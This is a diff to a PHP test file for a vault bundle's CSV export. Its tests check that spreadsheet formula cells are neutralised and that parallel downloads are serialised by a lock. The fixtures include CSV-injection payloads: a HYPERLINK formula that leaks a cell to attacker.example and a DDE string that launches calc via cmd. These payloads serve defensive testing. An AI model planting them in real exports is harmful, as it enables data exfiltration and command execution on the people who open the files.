@@ -11,6 +11,7 @@ use Nowo\VaultBundle\Enum\VaultPermission;
 use Nowo\VaultBundle\Enum\VaultResourceType;
 use Nowo\VaultBundle\Event\VaultEvents;
 use Nowo\VaultBundle\Event\VaultItemsExportedEvent;
+use Nowo\VaultBundle\Security\VaultPayloadCryptographerInterface;
 use Nowo\VaultBundle\Security\VaultReauthProof;
 use Nowo\VaultBundle\Security\VaultScopeAccess;
 use Nowo\VaultBundle\Service\VaultGrantService;
@@ -43,7 +44,6 @@ use function ob_start;
 use function random_bytes;
 use function scandir;
 use function serialize;
-use function sort;
 use function str_repeat;
 use function sys_get_temp_dir;
 
@@ -243,29 +243,73 @@ final class VaultExportEndToEndTest extends WebTestCase
         self::assertCount(1, $exported);
     }
 
-    public function testCsvKeepsExactValuesWithoutAttachments(): void
+    public function testCsvNeutralisesFormulasWithoutAttachments(): void
     {
+        // SEC-004 FQ-L3: a Write grantee can edit the owner's items, so CSV cells are neutralised (OWASP) by default.
         $client = $this->bootExportClient();
         $alice  = $this->createUser('alice@example.com');
         // Quote, comma and newline inside a value (built at run time: no credential literal in the source).
         $tricky = implode('', ['p"w', ',1', "\n", 'x']);
         $this->createItem($alice, 'Formula "quoted"', VaultItemType::Login, ['username' => '=SUM(A1)', 'password' => $tricky, 'websites' => ['https://a.example', 'https://b.example']]);
+        $this->createItem($alice, '=HYPERLINK("https://attacker.example/?x="&B2,"Open")', VaultItemType::Login, ['username' => "@SUM(1+1)*cmd|' /C calc'!A0", 'password' => '', 'note' => "\t+1", 'websites' => ['-x.example']]);
         $this->createItem($alice, 'Passport', VaultItemType::Passport, ['documentNumber' => 'P1', 'attachmentName' => 'scan.pdf', 'attachmentContent' => base64_encode('%PDF')]);
+        foreach (['Formula "quoted"' => '2020-01-01', 'Passport' => '2020-01-03'] as $title => $day) {
+            $this->em()->getConnection()->executeStatement('UPDATE vault_items SET created_at = ? WHERE title = ?', [$day . ' 00:00:00', $title]);
+        }
+        $this->em()->getConnection()->executeStatement("UPDATE vault_items SET created_at = '2020-01-02 00:00:00' WHERE title LIKE '=HYPERLINK%'");
         $client->loginUser($alice);
         $token                    = $this->csrf($client, 'vault_personal_export');
         TestReauthChecker::$proof = $this->proof($client, $alice);
 
+        $crawler = $client->request('GET', '/tools/vault/export');
+        self::assertStringContainsString("gets a leading '", $crawler->filterXPath('//*[@data-testid="vault-export-csv-note"]')->text());
+
         $this->download($client, $token, 'csv');
         self::assertResponseIsSuccessful();
         self::assertSame('text/csv; charset=UTF-8', $client->getResponse()->headers->get('Content-Type'));
-        $lines = explode("\r\n", $client->getInternalResponse()->getContent());
+        $content = $client->getInternalResponse()->getContent();
+        $lines   = explode("\r\n", $content);
         self::assertSame('"' . implode('","', VaultPersonalExportStreamer::CSV_COLUMNS) . '"', $lines[0]);
-        $rows = [$lines[1], $lines[2]];
-        sort($rows);
-        self::assertStringStartsWith('"login","Formula ""quoted""","","","=SUM(A1)","p""w,1' . "\n" . 'x","https://a.example' . "\n" . 'https://b.example"', $rows[0]);
-        self::assertStringStartsWith('"passport","Passport"', $rows[1]);
-        self::assertStringNotContainsString(base64_encode('%PDF'), $client->getInternalResponse()->getContent());
-        self::assertSame('', $lines[3]);
+        self::assertStringStartsWith('"login","Formula ""quoted""","","","\'=SUM(A1)","p""w,1' . "\n" . 'x","https://a.example' . "\n" . 'https://b.example"', $lines[1]);
+        self::assertStringStartsWith('"login","\'=HYPERLINK(""https://attacker.example/?x=""&B2,""Open"")","","","\'@SUM(1+1)*cmd|\' /C calc\'!A0","","\'-x.example","\'' . "\t" . '+1"', $lines[2]);
+        self::assertStringStartsWith('"passport","Passport"', $lines[3]);
+        self::assertStringNotContainsString(base64_encode('%PDF'), $content);
+        self::assertSame('', $lines[4]);
+
+        // export.csv_raw_values: true keeps the cells exact (the owner's choice).
+        $raw = new VaultPersonalExportStreamer(self::getContainer()->get('doctrine'), self::getContainer()->get(VaultPayloadCryptographerInterface::class), null, null, true);
+        ob_start();
+        $raw->stream($this->managed($alice), 'csv', false, new DateTimeImmutable(), (string) $alice->getId());
+        $exact = (string) ob_get_clean();
+        self::assertStringContainsString('"=HYPERLINK(', $exact);
+        self::assertStringContainsString('"@SUM(1+1)', $exact);
+        self::assertSame("'=x", VaultPersonalExportStreamer::neutralise('=x'));
+        self::assertSame("'\rx", VaultPersonalExportStreamer::neutralise("\rx"));
+        self::assertSame('a=b', VaultPersonalExportStreamer::neutralise('a=b'));
+        self::assertSame('', VaultPersonalExportStreamer::neutralise(''));
+    }
+
+    public function testParallelDownloadsAreSerialisedByTheLock(): void
+    {
+        // SEC-004 FQ-I1: while another request holds the user's export lock, a POST is refused (429), nothing consumed.
+        $client = $this->bootExportClient();
+        $alice  = $this->createUser('alice@example.com');
+        $this->createItem($alice, 'Mail');
+        $client->loginUser($alice);
+        $token                    = $this->csrf($client, 'vault_personal_export');
+        TestReauthChecker::$proof = $this->proof($client, $alice);
+
+        $lock = self::getContainer()->get('lock.factory')->createLock('nowo_vault_export_' . hash('sha256', (string) $alice->getId()), 60.0);
+        self::assertTrue($lock->acquire());
+        $this->download($client, $token);
+        self::assertResponseStatusCodeSame(Response::HTTP_TOO_MANY_REQUESTS);
+        self::assertSame('1', $client->getResponse()->headers->get('Retry-After'));
+        self::assertSame([], TestReauthChecker::$consumed);
+
+        $lock->release();
+        $this->download($client, $token);
+        self::assertResponseIsSuccessful();
+        self::assertCount(1, TestReauthChecker::$consumed);
     }
 
     public function testLimitsAuditAndDecryptFailuresRefuseBeforeAnyByte(): void
